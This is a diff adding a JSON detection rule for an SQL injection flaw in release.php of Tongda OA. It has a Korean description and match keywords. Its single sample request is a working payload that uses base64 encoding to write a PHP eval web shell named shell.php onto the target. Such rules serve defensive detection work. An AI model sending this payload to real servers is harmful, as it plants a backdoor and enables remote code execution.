@@ -1,0 +1,11 @@
+{
+        "Name": "Tongda OA release.php SQL Injection ",
+        "Description": "-   프로세스, 데이터 연결, 비즈니스 시스템 통합을 지원하는 중국에서 사용되는 PHP 기반 오픈 소스 CMS \n -   release.php 에서 entity_name 매개 변수를 통해 전달되는 값을 적절하게 검증하지 않았기 때문에 발생\n -   악용에 성공하면 임의의 코드가 실행",
+        "References": [],
+        "Samples": [
+			"GET /crm/studio/modules/EntityRelease/release.php?entity_name=1%d5'%20or%20sys_function.FUNC_ID=1%23%20${%20fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz5vaw))} HTTP/1.1"
+		   ],
+        "Keywords": [["release.php"],["entity_name"],["URI"]],
+        "Signature": []
+}
+
